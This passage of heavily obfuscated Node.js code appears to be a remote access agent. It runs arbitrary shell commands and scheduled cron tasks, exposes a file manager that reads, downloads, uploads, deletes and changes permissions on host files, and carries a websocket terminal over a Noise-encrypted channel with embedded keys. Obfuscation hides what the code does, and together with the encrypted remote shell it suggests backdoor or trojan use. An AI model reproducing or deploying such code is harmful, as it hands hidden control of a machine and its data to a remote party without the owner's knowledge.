    ];
    a0a = function () {
        return c1;
    };
    return a0a();
}
class a0H {
    static async [a0S(0x338)](a, b = {}) {
        const az = a0S, c = {
                'fFIIm': function (d, f) {
                    return d - f;
                },
                'HfZnx': function (d, f) {
                    return d === f;
                },
                'jcjiB': az(0x37c),
                'kdKWf': function (d, f) {
                    return d * f;
                },
                'dEgaO': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process['cwd'](),
                env: env = {},
                timeout: timeout = a0D[az(0x355)]
            } = b;
        return new Promise(d => {
            const aB = az, f = {
                    'yClhX': function (i, j) {
                        return c['fFIIm'](i, j);
                    },
                    'HccgP': function (i, j) {
                        return i || j;
                    },
                    'WxoHC': function (i, j) {
                        const aA = a0b;
                        return c[aA(0x1e9)](i, j);
                    },
                    'XUtKZ': c[aB(0x203)]
                }, g = Date[aB(0x146)](), h = a0l(a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': timeout * 0x3e8,
                    'maxBuffer': c[aB(0x222)](c[aB(0x217)](0xa, 0x400), 0x400)
                }, (i, j, k) => {
                    const aC = aB, l = f[aC(0x27f)](Date[aC(0x146)](), g), m = i && i[aC(0x3b0)] && i['signal'];
                    let n = f[aC(0x2b9)](j, '');
                    if (k)
                        n += k;
                    let o = 0x0;
                    if (i) {
                        if (m)
                            o = 0x7c;
                        else
                            f[aC(0x29c)](typeof i['code'], f[aC(0x25b)]) ? o = i['code'] : o = -0x1;
                    }
                    d({
                        'result': n,
                        'exitcode': o,
                        'timeout': m,
                        'cmd': a
                    });
                });
        });
    }
}
class a0I {
    static async [a0S(0x160)](a, b = ![]) {
        const aD = a0S, c = {
                'cHCNO': aD(0x34c),
                'yIOAT': aD(0x2cb),
                'DZVMx': function (h, i) {
                    return h & i;
                },
                'nfweI': function (h, i) {
                    return h(i);
                },
                'yZxXA': function (h, i) {
                    return h || i;
                },
                'cqxVD': aD(0x241),
                'PQmzE': aD(0x307),
                'jnogP': function (h, i) {
                    return h(i);
                }
            }, d = a0j['resolve'](a0D['FILE_ROOT'], c['yZxXA'](a, '.'));
        if (!d[aD(0x177)](a0D[aD(0x2ee)]))
            throw new Error(c[aD(0x3e7)]);
        if (!a0h[aD(0x378)](d))
            throw new Error(c[aD(0x1d5)]);
        const f = [], g = h => {
                const aE = aD, i = a0h['readdirSync'](h);
                for (const j of i) {
                    const k = a0j['join'](h, j), l = a0h[aE(0x387)](k), m = new a0z();
                    m['name'] = j, m[aE(0x3c0)] = a0j['relative'](a0D[aE(0x2ee)], k), m[aE(0x41c)] = l[aE(0x1d2)]() ? c[aE(0x36b)] : c['yIOAT'], m[aE(0x1ab)] = l['size'], m[aE(0x17b)] = l[aE(0x17b)][aE(0x271)](), m[aE(0x373)] = this[aE(0x332)](l[aE(0x373)], l[aE(0x1d2)]()), m['mode_octal'] = '0o' + c['DZVMx'](l[aE(0x373)], 0x1ff)[aE(0x39e)](0x8), m[aE(0x309)] = l[aE(0x1b9)] + ':' + l[aE(0x3cd)], f[aE(0x28e)](m), b && l[aE(0x1d2)]() && c['nfweI'](g, k);
                }
            };
        return c[aD(0x3ed)](g, d), f;
    }
    static async ['getFilePermissions'](a) {
        const aF = a0S, b = {
                'qeMiz': function (d, f) {
                    return d & f;
                },
                'pTXly': aF(0x34c),
                'uHdBf': aF(0x2cb)
            }, c = [];
        for (const d of a) {
            const f = a0j[aF(0x12e)](a0D[aF(0x2ee)], d);
            if (!f['startsWith'](a0D[aF(0x2ee)]))
                continue;
            try {
                const g = a0h['statSync'](f), h = this[aF(0x3a1)](f, a0h[aF(0x141)]['R_OK']), i = this[aF(0x3a1)](f, a0h[aF(0x141)][aF(0x243)]), j = this[aF(0x3a1)](f, a0h[aF(0x141)][aF(0x2be)]), k = new a0A();
                k[aF(0x3c0)] = a0j[aF(0x3d8)](a0D[aF(0x2ee)], f), k['name'] = a0j[aF(0x1a9)](f), k[aF(0x373)] = this[aF(0x332)](g[aF(0x373)], g[aF(0x1d2)]()), k[aF(0x1ad)] = '0o' + b[aF(0x183)](g[aF(0x373)], 0x1ff)[aF(0x39e)](0x8), k['type'] = g[aF(0x1d2)]() ? b['pTXly'] : b['uHdBf'], k[aF(0x26e)] = h, k['writable'] = i, k[aF(0x38e)] = j, c[aF(0x28e)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0S(0x3a1)](a, b) {
        const aG = a0S;
        try {
            return a0h[aG(0x1bc)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0S(0x28f)](a) {
        const aH = a0S, b = {
                'NjJLO': 'number',
                'BkLvu': function (c, d) {
                    return c === d;
                }
            };
        if (typeof a === b[aH(0x32c)])
            return a;
        if (b['BkLvu'](typeof a, aH(0x3e0))) {
            const c = a[aH(0x2ff)]();
            if (/^[0-7]{3,4}$/[aH(0x14c)](c))
                return parseInt(c, 0x8);
        }
        throw new Error(aH(0x354));
    }
    static [a0S(0x332)](a, b) {
        const aI = a0S, c = {
                'JOQtm': function (i, j) {
                    return i & j;
                },
                'fIgms': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = c['JOQtm'](a, 0x1ff)[aI(0x39e)](0x8)['padStart'](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[aI(0x20d)](parseInt, i, 0xa);
            h += f[aI(0x1fc)]((k, l) => j & 0x4 >> l ? k : '-')['join']('');
        }
        return h;
    }
    static async [a0S(0x306)](a, b = ![]) {
        const aJ = a0S, c = {
                'NSuSJ': function (g, h) {
                    return g(h);
                }
            }, d = [];
        for (const [g, h] of Object['entries'](a)) {
            const i = a0j[aJ(0x12e)](a0D[aJ(0x2ee)], g);
            if (!i['startsWith'](a0D[aJ(0x2ee)])) {
                d['push']({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': aJ(0x2a6)
                });
                continue;
            }
            try {
                const j = this[aJ(0x28f)](h), k = m => {
                        const aK = aJ;
                        a0h[aK(0x2ab)](m, j);
                    };
                if (b && a0h['existsSync'](i) && a0h[aJ(0x387)](i)['isDirectory']()) {
                    const m = n => {
                        const aL = aJ;
                        k(n);
                        const o = a0h[aL(0x276)](n);
                        for (const p of o) {
                            const q = a0j[aL(0x392)](n, p);
                            a0h[aL(0x387)](q)[aL(0x1d2)]() ? c[aL(0x301)](m, q) : c[aL(0x301)](k, q);
                        }
                    };
                    m(i);
                } else
                    k(i);
                const l = j['toString'](0x8);
                d[aJ(0x28e)]({
                    'path': g,
                    'requested': c['NSuSJ'](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[aJ(0x28e)]({
                    'path': g,
                    'requested': c[aJ(0x301)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': aJ(0x170),
                    'message': n[aJ(0x197)]
                });
            }
        }
        const f = d[aJ(0x14d)](o => o['status'] === 'ok')[aJ(0x182)];
        return {
            'status': 'ok',
            'total': d['length'],
            'success': f,
            'results': d
        };
    }
    static async [a0S(0x273)](a) {
        const aM = a0S, b = {
                'HQahR': function (h, i) {
                    return h > i;
                },
                'VvxVY': function (h, i) {
                    return h * i;
                },
                'Bhltl': aM(0x17f),
                'cqHSO': aM(0x3b5),
                'LLaeT': 'base64'
            }, c = a0j['resolve'](a0D[aM(0x2ee)], a);
        if (!c[aM(0x177)](a0D[aM(0x2ee)]))
            throw new Error(aM(0x241));
        const d = a0h[aM(0x387)](c);
        if (b[aM(0x18f)](d[aM(0x1ab)], b[aM(0x1e5)](0x400, 0x400)))
            throw new Error(b[aM(0x24d)]);
        const f = a0h['readFileSync'](c), g = this['_isBinary'](f);
        return {
            'status': 'ok',
            'path': a0j[aM(0x3d8)](a0D[aM(0x2ee)], c),
            'content': g ? a0p[aM(0x290)](f) : f[aM(0x39e)](b[aM(0x1a0)]),
            'encoding': g ? b[aM(0x32d)] : aM(0x1b7),
            'is_binary': g,
            'size': d[aM(0x1ab)]
        };
    }
    static [a0S(0x39f)](a) {
        const aN = a0S, b = {
                'SUubO': function (c, d) {
                    return c < d;
                },
                'QoTqV': function (c, d) {
                    return c === d;
                }
            };
        if (!a || a[aN(0x182)] === 0x0)
            return ![];
        for (let c = 0x0; b[aN(0x1c2)](c, Math[aN(0x12f)](a[aN(0x182)], 0x200)); c++) {
            if (b[aN(0x152)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0S(0x32a)](a, b, c, d = null, f = null) {
        const aO = a0S, g = {
                'ZSmhM': function (l, m) {
                    return l > m;
                },
                'nXbIy': aO(0x17f),
                'lIDoS': function (l, m) {
                    return l !== m;
                },
                'zWbQf': function (l, m) {
                    return l !== m;
                },
                'TIKtr': function (l, m) {
                    return l(m);
                },
                'gyffI': aO(0x2ce),
                'Rvzlr': '.upload_chunks',
                'HxZjL': function (l, m) {
                    return l === m;
                },
                'IICqc': function (l, m) {
                    return l < m;
                }
            }, h = a0j[aO(0x12e)](a0D[aO(0x2ee)], a);
        let j = h;
        b && (j = a0j[aO(0x392)](h, b));
        if (!j[aO(0x177)](a0D['FILE_ROOT']))
            throw new Error(aO(0x241));
        !a0h[aO(0x378)](a0j['dirname'](j)) && a0h[aO(0x18c)](a0j[aO(0x12c)](j), { 'recursive': !![] });
        const k = a0p['toByteArray'](c);
        if (g['ZSmhM'](k[aO(0x182)], a0D['MAX_UPLOAD_SIZE']))
            throw new Error(g[aO(0x2d0)]);
        if (g[aO(0x26b)](d, null) && g[aO(0x237)](f, null)) {
            const l = g[aO(0x167)](Number, d), m = g[aO(0x167)](Number, f);
            if (Number[aO(0x3f5)](l) || Number[aO(0x3f5)](m))
                throw new Error(g[aO(0x367)]);
            const n = a0j[aO(0x392)](a0j[aO(0x12c)](j), g[aO(0x2e3)], a0j[aO(0x1a9)](j));
            !a0h[aO(0x378)](n) && a0h[aO(0x18c)](n, { 'recursive': !![] });
            const o = a0j[aO(0x392)](n, 'chunk_' + l);
            a0h[aO(0x19e)](o, k);
            const p = a0h[aO(0x276)](n)['filter'](s => s[aO(0x177)](aO(0x13b))), q = p['length'], r = g['HxZjL'](q, m);
            if (r) {
                const s = a0h[aO(0x1b8)](j);
                for (let t = 0x0; g[aO(0x154)](t, m); t++) {
                    const u = a0j[aO(0x392)](n, 'chunk_' + t);
                    if (!a0h[aO(0x378)](u)) {
                        s[aO(0x3f6)]();
                        throw new Error(aO(0x413) + t);
                    }
                    s[aO(0x1c1)](a0h[aO(0x1ed)](u));
                }
                s[aO(0x29d)]();
                for (const v of a0h['readdirSync'](n)) {
                    a0h['unlinkSync'](a0j[aO(0x392)](n, v));
                }
                a0h[aO(0x1b1)](n, { 'recursive': !![] });
            }
            return {
                'status': 'ok',
                'path': a0j[aO(0x3d8)](a0D['FILE_ROOT'], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0h[aO(0x19e)](j, k), {
            'status': 'ok',
            'path': a0j[aO(0x3d8)](a0D[aO(0x2ee)], j),
            'received': k['length'],
            'total': k[aO(0x182)],
            'chunked': ![]
        };
    }
    static async ['downloadFile'](a) {
        const aP = a0S, b = {
                'oEMbc': aP(0x241),
                'bjano': aP(0x321)
            }, c = a0j[aP(0x12e)](a0D[aP(0x2ee)], a);
        if (!c[aP(0x177)](a0D[aP(0x2ee)]))
            throw new Error(b[aP(0x1bd)]);
        if (!a0h[aP(0x378)](c))
            throw new Error(b['bjano']);
        const d = a0h[aP(0x387)](c), f = a0h[aP(0x1ed)](c), g = a0p[aP(0x290)](f);
        return {
            'path': a0j[aP(0x3d8)](a0D[aP(0x2ee)], c),
            'content': g,
            'size': d['size']
        };
    }
    static async ['deleteFiles'](a) {
        const aQ = a0S, b = {
                'rXUpQ': aQ(0x2a6),
                'hpfvB': aQ(0x170)
            }, c = [];
        for (const d of a) {
            const f = a0j[aQ(0x12e)](a0D[aQ(0x2ee)], d);
            if (!f[aQ(0x177)](a0D['FILE_ROOT'])) {
                c[aQ(0x28e)]({
                    'path': d,
                    'status': b[aQ(0x329)]
                });
                continue;
            }
            try {
                if (a0h[aQ(0x378)](f)) {
                    const g = a0h[aQ(0x387)](f);
                    g[aQ(0x1d2)]() ? a0h['rmdirSync'](f, { 'recursive': !![] }) : a0h['unlinkSync'](f), c[aQ(0x28e)]({
                        'path': d,
                        'status': aQ(0x346)
                    });
                } else
                    c['push']({
                        'path': d,
                        'status': 'not_found'
                    });
            } catch (h) {
                c[aQ(0x28e)]({
                    'path': d,
                    'status': b[aQ(0x201)],
                    'message': h[aQ(0x197)]
                });
            }
        }
        return c;
    }
    static async [a0S(0x1c6)](a) {
        const aR = a0S, b = [];
        for (const [c, d] of Object[aR(0x27c)](a)) {
            const f = a0j[aR(0x12e)](a0D[aR(0x2ee)], c), g = a0j[aR(0x12e)](a0D[aR(0x2ee)], d);
            if (!f['startsWith'](a0D[aR(0x2ee)]) || !g['startsWith'](a0D[aR(0x2ee)])) {
                b[aR(0x28e)]({
                    'from': c,
                    'to': d,
                    'status': aR(0x2a6)
                });
                continue;
            }
            try {
                const h = a0j[aR(0x12c)](g);
                !a0h[aR(0x378)](h) && a0h[aR(0x18c)](h, { 'recursive': !![] }), a0h[aR(0x38d)](f, g), b[aR(0x28e)]({
                    'from': c,
                    'to': d,
                    'status': 'ok'
                });
            } catch (i) {
                b[aR(0x28e)]({
                    'from': c,
                    'to': d,
                    'status': 'error',
                    'message': i[aR(0x197)]
                });
            }
        }
        return b;
    }
    static async [a0S(0x27e)](a) {
        const aS = a0S, b = {
                'VSHMo': function (d, f, g) {
                    return d(f, g);
                },
                'OYNCe': aS(0x2a6),
                'JSyMD': 'error'
            }, c = [];
        for (const [d, f] of Object[aS(0x27c)](a)) {
            const g = a0j[aS(0x12e)](a0D[aS(0x2ee)], d), h = a0j[aS(0x12e)](a0D[aS(0x2ee)], f);
            if (!g['startsWith'](a0D[aS(0x2ee)]) || !h[aS(0x177)](a0D['FILE_ROOT'])) {
                c[aS(0x28e)]({
                    'from': d,
                    'to': f,
                    'status': b[aS(0x348)]
                });
                continue;
            }
            try {
                if (!a0h[aS(0x378)](g)) {
                    c[aS(0x28e)]({
                        'from': d,
                        'to': f,
                        'status': aS(0x33e)
                    });
                    continue;
                }
                const i = a0j['dirname'](h);
                !a0h[aS(0x378)](i) && a0h['mkdirSync'](i, { 'recursive': !![] });
                const j = a0h[aS(0x387)](g);
                if (j['isDirectory']()) {
                    if (a0h[aS(0x19a)])
                        a0h[aS(0x19a)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const aT = aS;
                            if (a0h[aT(0x387)](l)[aT(0x1d2)]()) {
                                if (!a0h['existsSync'](m))
                                    a0h[aT(0x18c)](m, { 'recursive': !![] });
                                for (const n of a0h['readdirSync'](l)) {
                                    b[aT(0x1d8)](k, a0j['join'](l, n), a0j[aT(0x392)](m, n));
                                }
                            } else
                                a0h[aT(0x2cf)](l, m);
                        };
                        b[aS(0x1d8)](k, g, h);
                    }
                } else
                    a0h['copyFileSync'](g, h);
                c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[aS(0x28e)]({
                    'from': d,
                    'to': f,
                    'status': b[aS(0x270)],
                    'message': l['message']
                });
            }
        }
        return c;
    }
    static async ['createDirectory'](a) {
        const aU = a0S, b = { 'twHnd': aU(0x241) }, c = a0j[aU(0x12e)](a0D[aU(0x2ee)], a);
        if (!c[aU(0x177)](a0D[aU(0x2ee)]))
            throw new Error(b[aU(0x158)]);
        return a0h[aU(0x18c)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0j['relative'](a0D[aU(0x2ee)], c)
        };
    }
}
class a0J {
    static [a0S(0x2c8)] = new Map();
    static [a0S(0x2ae)](a, b) {
        const aV = a0S, c = {
                'aQbEF': function (d, f) {
                    return d > f;
                },
                'ohdhR': function (d, f) {
                    return d - f;
                }
            };
        a[aV(0x28e)](b), c['aQbEF'](a['length'], a0D[aV(0x2a1)]) && a[aV(0x3a8)](0x0, c[aV(0x202)](a[aV(0x182)], a0D[aV(0x2a1)]));
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const aW = a0S, g = new Date()[aW(0x271)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + aW(0x3b7) + a + aW(0x19f) + c + '\x0a' + (b?.[aW(0x2ff)]() || '')
        };
    }
    static [a0S(0x134)]() {
        const aX = a0S;
        return {
            'status': 'ok',
            'count': a0D[aX(0x1d3)]['length'],
            'tasks': a0D[aX(0x1d3)]
        };
    }
    static async [a0S(0x23d)](a) {
        const aY = a0S, b = {
                'IXIQM': function (d, f) {
                    return d < f;
                },
                'KhPgU': aY(0x40e),
                'uADwa': aY(0x170)
            };
        a0D['onetasks'] = a || [], a0D[aY(0x35f)] = !![];
        const c = [];
        for (let d = 0x0; b[aY(0x24f)](d, a0D[aY(0x1d3)][aY(0x182)]); d++) {
            const f = a0D[aY(0x1d3)][d], g = await a0H['execute'](f), h = this['_formatLogEntry'](f, g[aY(0x204)], g[aY(0x1a8)], b[aY(0x22c)]);
            this[aY(0x2ae)](a0D[aY(0x3ac)], h), c['push']({
                'index': d,
                'cmd': f,
                'exitcode': g['exitcode'],
                'output': g[aY(0x204)],
                'status': g['exitcode'] === 0x0 ? 'ok' : b[aY(0x19d)]
            });
        }
        return a0D[aY(0x35f)] = ![], {
            'status': 'ok',
            'count': a0D[aY(0x1d3)]['length'],
            'tasks': a0D[aY(0x1d3)],
            'executed': c
        };
    }
    static [a0S(0x3a7)]() {
        const aZ = a0S;
        return {
            'status': 'ok',
            'count': Object[aZ(0x3f3)](a0D['crontasks'])[aZ(0x182)],
            'tasks': a0D[aZ(0x24e)]
        };
    }
    static ['setCronTasks'](a) {
        const b0 = a0S, b = {
                'qosPT': function (d, f) {
                    return d === f;
                },
                'Wouiu': 'function',
                'CwnRS': b0(0x3a3),
                'wQRKk': function (d, f) {
                    return d > f;
                },
                'ciaGm': b0(0x170),
                'YmdmF': function (d, f) {
                    return d || f;
                },
                'dNvOr': function (d, f) {
                    return d || f;
                },
                'SguQM': function (d, f) {
                    return d > f;
                }
            };
        this[b0(0x2c8)][b0(0x3c2)](d => {
            const b1 = b0;
            b[b1(0x1cf)](typeof d[b1(0x304)], b[b1(0x341)]) && d[b1(0x304)](), typeof d[b1(0x1aa)] === b['Wouiu'] && d[b1(0x1aa)]();
        }), this[b0(0x2c8)][b0(0x156)]();
        const c = [];
        for (const d of Object[b0(0x3f3)](a || {})) {
            !a0m[b0(0x397)](d) && c[b0(0x28e)](d);
        }
        if (b['wQRKk'](c[b0(0x182)], 0x0))
            return {
                'status': b[b0(0x25e)],
                'message': b0(0x1da) + c[b0(0x392)](',\x20'),
                'valid_count': Object[b0(0x3f3)](b[b0(0x1ea)](a, {}))[b0(0x182)] - c[b0(0x182)]
            };
        a0D['crontasks'] = b[b0(0x25a)](a, {});
        for (const [f, g] of Object[b0(0x27c)](a0D[b0(0x24e)])) {
            const h = a0m[b0(0x1bb)](f, async () => {
                const b2 = b0, i = await a0H['execute'](g), j = this[b2(0x279)](g, i[b2(0x204)], i['exitcode'], b['CwnRS'], f);
                this[b2(0x2ae)](a0D[b2(0x374)], j);
            });
            this['cronJobs'][b0(0x138)](f, h);
        }
        return a0D[b0(0x140)] = b[b0(0x327)](Object[b0(0x3f3)](a0D[b0(0x24e)])[b0(0x182)], 0x0), {
            'status': 'ok',
            'count': Object['keys'](a0D[b0(0x24e)])[b0(0x182)],
            'tasks': a0D[b0(0x24e)]
        };
    }
    static [a0S(0x365)]() {
        const b3 = a0S;
        return {
            'onetime': {
                'pending': a0D['InitTask'],
                'count': a0D[b3(0x1d3)][b3(0x182)]
            },
            'cron': {
                'active': a0D[b3(0x140)],
                'count': Object[b3(0x3f3)](a0D[b3(0x24e)])[b3(0x182)],
                'check_interval': a0D['CRON_CHECK_INTERVAL']
            }
        };
    }
    static ['getOnetimeLogs'](a = 0x32) {
        const b4 = a0S, b = a0D['onetimetasks_log'][b4(0x418)](-a);
        return {
            'status': 'ok',
            'count': b['length'],
            'logs': b
        };
    }
    static ['getCronLogs'](a = 0x32) {
        const b5 = a0S, b = a0D[b5(0x374)]['slice'](-a);
        return {
            'status': 'ok',
            'count': b[b5(0x182)],
            'logs': b
        };
    }
    static [a0S(0x370)]() {
        const b6 = a0S, a = { 'DobVq': b6(0x40e) }, b = a0D['onetimetasks_log']['length'];
        return a0D[b6(0x3ac)] = [], {
            'status': 'ok',
            'cleared': a['DobVq']
        };
    }
    static ['clearCronLogs']() {
        const b7 = a0S, a = { 'ONUTf': b7(0x3a3) }, b = a0D['crontasks_log'][b7(0x182)];
        return a0D[b7(0x374)] = [], {
            'status': 'ok',
            'cleared': a[b7(0x212)]
        };
    }
    static [a0S(0x192)]() {
        const b8 = a0S, a = {
                'StWRU': function (g, h) {
                    return g - h;
                },
                'hsXWF': function (g, h) {
                    return g - h;
                }
            }, b = a0D[b8(0x3ac)][b8(0x14d)](g => g[b8(0x1a8)] === 0x0)['length'], c = a['StWRU'](a0D['onetimetasks_log'][b8(0x182)], b), d = a0D[b8(0x374)]['filter'](g => g[b8(0x1a8)] === 0x0)[b8(0x182)], f = a[b8(0x142)](a0D['crontasks_log'][b8(0x182)], d);
        return {
            'onetime': {
                'total_logged': a0D[b8(0x3ac)][b8(0x182)],
                'max_capacity': a0D[b8(0x2a1)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0D[b8(0x374)]['length'],
                'max_capacity': a0D[b8(0x2a1)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async [a0S(0x1f9)]() {
        const b9 = a0S, a = {
                'rNbaK': function (c, d) {
                    return c < d;
                },
                'XtdGg': 'onetime'
            }, b = [];
        for (let c = 0x0; a[b9(0x3f4)](c, a0D[b9(0x1d3)][b9(0x182)]); c++) {
            const d = a0D[b9(0x1d3)][c], f = await a0H['execute'](d), g = this[b9(0x279)](d, f[b9(0x204)], f[b9(0x1a8)], a['XtdGg']);
            this[b9(0x2ae)](a0D[b9(0x3ac)], g), b[b9(0x28e)]({
                'cmd': d,
                'exitcode': f[b9(0x1a8)],
                'output': f[b9(0x204)],
                'timeout': f[b9(0x286)]
            });
        }
        return a0D[b9(0x35f)] = ![], {
            'status': 'ok',
            'executed': b[b9(0x182)],
            'results': b
        };
    }
}
let a0K = null, a0L = null;
const a0M = new Promise((a, b) => {
    const ba = a0S, c = {
            'nWWFs': 'Failed\x20to\x20load\x20noise-c.wasm\x20module',
            'CldmD': ba(0x400),
            'wJeoD': ba(0x330),
            'UvXXB': function (d, f) {
                return d(f);
            },
            'ZcRpO': '[WARN]\x20Exception\x20loading\x20Noise\x20module:',
            'FvDNZ': function (d) {
                return d();
            }
        };
    try {
        c['UvXXB'](a0r, function (d) {
            const bb = ba;
            if (!d) {
                a0L = new Error(c[bb(0x16b)]), a0t['warn'](c['CldmD'], a0L[bb(0x197)]), a();
                return;
            }
            a0K = d, a0t[bb(0x3e6)](c[bb(0x2ea)]), a();
        });
    } catch (d) {
        a0L = d, a0t[ba(0x356)](c['ZcRpO'], d[ba(0x197)]), c['FvDNZ'](a);
    }
});
process['on'](a0S(0x302), (a, b) => {
    const bc = a0S;
    a0t[bc(0x170)](bc(0x209), a);
}), process['on'](a0S(0x1c3), a => {
    const bd = a0S, b = { 'zgOdI': bd(0x407) };
    a0t['error'](b[bd(0x186)], a), process['exit'](0x1);
});
class a0N {
    constructor(a, b, c) {
        const be = a0S, d = { 'PIaOc': be(0x303) }, f = d[be(0x2da)][be(0x2c5)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[be(0x3f1)] = b;
                continue;
            case '1':
                this['isInitiator'] = a;
                continue;
            case '2':
                this[be(0x35c)] = null;
                continue;
            case '3':
                this[be(0x2b1)] = c;
                continue;
            case '4':
                this[be(0x396)] = null;
                continue;
            case '5':
                this['handshakeFinished'] = ![];
                continue;
            case '6':
                this['hs'] = null;
                continue;
            }
            break;
        }
    }
    async ['init']() {
        const bf = a0S, a = {
                'BdKnA': bf(0x297),
                'zCDaL': bf(0x281),
                'Oeoyp': 'kisama_terminal_v1',
                'oQEQK': bf(0x308)
            };
        await a0M;
        if (!a0K)
            throw a0L || new Error(a[bf(0x335)]);
        const b = a0K, c = this['isInitiator'] ? b[bf(0x141)][bf(0x35b)] : b[bf(0x141)][bf(0x257)];
        this['hs'] = b[bf(0x2ed)](a[bf(0x1b6)], c);
        const d = Buffer['from'](a[bf(0x393)]), f = this['localPrivB64'] ? Buffer[bf(0x33a)](this[bf(0x3f1)], a[bf(0x144)]) : null, g = this[bf(0x2b1)] ? Buffer['from'](this[bf(0x2b1)], a[bf(0x144)]) : null;
        this['hs'][bf(0x137)](d, f, g, null);
    }
    [a0S(0x406)](a) {
        const bg = a0S, b = {
                'tdnlC': function (d, f) {
                    return d > f;
                },
                'ydweN': function (d, f) {
                    return d === f;
                },
                'XyDKO': function (d, f) {
                    return d === f;
                }
            };
        if (this[bg(0x235)])
            return Buffer[bg(0x190)](0x0);
        const c = a0K;
        a && b[bg(0x299)](a[bg(0x182)], 0x0) && b[bg(0x1dc)](this['hs'][bg(0x3be)](), c['constants']['NOISE_ACTION_READ_MESSAGE']) && this['hs'][bg(0x1b0)](a);
        if (b[bg(0x1dc)](this['hs'][bg(0x3be)](), c[bg(0x141)][bg(0x2d7)]))
            return this[bg(0x153)](), Buffer[bg(0x190)](0x0);
        if (b[bg(0x1dc)](this['hs']['GetAction'](), c[bg(0x141)][bg(0x2e6)])) {
            const d = this['hs'][bg(0x1ac)](new Uint8Array(0x0));
            return b[bg(0x3b3)](this['hs'][bg(0x3be)](), c['constants'][bg(0x2d7)]) && this[bg(0x153)](), Buffer[bg(0x33a)](d);
        }
        return Buffer[bg(0x190)](0x0);
    }
    [a0S(0x153)]() {
        const bh = a0S, a = this['hs'][bh(0x424)]();
        this[bh(0x396)] = a[0x0], this[bh(0x35c)] = a[0x1], this['handshakeFinished'] = !![];
        try {
            if (this['hs'])
                this['hs'][bh(0x275)]();
        } catch (b) {
        }
        this['hs'] = null;
    }
    [a0S(0x34f)](a) {
        const bi = a0S;
        if (!this[bi(0x235)])
            throw new Error(bi(0x14f));
        const b = new Uint8Array(0x0), c = new Uint8Array(a);
        return Buffer[bi(0x33a)](this[bi(0x396)][bi(0x3b2)](b, c));
    }
    [a0S(0x207)](a) {
        const bj = a0S, b = { 'yLCfW': bj(0x3c5) };
        if (!this[bj(0x235)])
            throw new Error(b[bj(0x283)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[bj(0x33a)](this['recvCipher'][bj(0x256)](c, d));
    }
    [a0S(0x275)]() {
        const bk = a0S;
        try {
            if (this[bk(0x396)])
                this[bk(0x396)][bk(0x275)]();
        } catch (a) {
        }
        try {
            if (this['recvCipher'])
                this[bk(0x35c)][bk(0x275)]();
        } catch (b) {
        }
        try {
            if (this['hs'])
                this['hs'][bk(0x275)]();
        } catch (c) {
        }
        this[bk(0x396)] = null, this[bk(0x35c)] = null, this['hs'] = null;
    }
}
class a0O {
    constructor() {
        const bl = a0S, a = {
                'vPQDo': '7|4|9|1|0|3|6|2|8|5',
                'fOvqh': bl(0x411)
            }, b = a[bl(0x3d6)][bl(0x2c5)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[bl(0x258)] = a[bl(0x3a2)];
                continue;
            case '1':
                this[bl(0x353)] = !![];
                continue;
            case '2':
                this[bl(0x3c4)] = a0D[bl(0x230)][bl(0x334)]['private_b64'];
                continue;
            case '3':
                this['msgQueue'] = [];
                continue;
            case '4':
                this[bl(0x359)] = null;
                continue;
            case '5':
                this[bl(0x422)] = new a0N(![], this[bl(0x3c4)], this[bl(0x399)]);
                continue;
            case '6':
                this[bl(0x231)] = [];
                continue;
            case '7':
                this[bl(0x2fe)] = null;
                continue;
            case '8':
                this[bl(0x399)] = a0D['NOISE_KEYS_INTERNAL'][bl(0x28c)][bl(0x2d9)];
                continue;
            case '9':
                this[bl(0x3ff)] = null;
                continue;
            }
            break;
        }
    }
    async [a0S(0x13e)]() {
        const bm = a0S, a = {
                'tgLjl': function (b, c) {
                    return b === c;
                },
                'ccBtY': 'Cleanly\x20closed'
            };
        this[bm(0x3ff)] && a0t[bm(0x419)]('[' + this['requestId'] + bm(0x20b));
        if (this['ptyProcess']) {
            try {
                this[bm(0x2fe)][bm(0x22e)]();
            } catch (b) {
            }
            this[bm(0x2fe)] = null;
        }
        if (this[bm(0x422)])
            this[bm(0x422)]['free']();
        if (this['websocket'])
            try {
                a[bm(0x305)](this[bm(0x359)][bm(0x147)], this[bm(0x359)][bm(0x1d6)]) && this[bm(0x359)]['close'](0x3e8, a[bm(0x161)]);
            } catch (c) {
            } finally {
                this['websocket'] = null;
            }
    }
    [a0S(0x3fc)](a) {
        const bn = a0S, b = {
                'hZGsF': function (c, d) {
                    return c === d;
                },
                'mBnnb': 'handshake',
                'jubJw': function (c, d) {
                    return c > d;
                },
                'dchwE': function (c, d) {
                    return c(d);
                },
                'XTCmW': function (c, d) {
                    return c === d;
                },
                'rzqFC': bn(0x386)
            };
        if (b[bn(0x3fa)](this[bn(0x258)], b[bn(0x3fe)])) {
            if (b[bn(0x31a)](this[bn(0x231)][bn(0x182)], 0x0)) {
                const c = this[bn(0x231)][bn(0x19c)]();
                b[bn(0x324)](c, a);
            } else
                this[bn(0x223)][bn(0x28e)](a);
        } else
            b[bn(0x39a)](this[bn(0x258)], b[bn(0x136)]) && this[bn(0x1a3)](a);
    }
    async [a0S(0x1f2)]() {
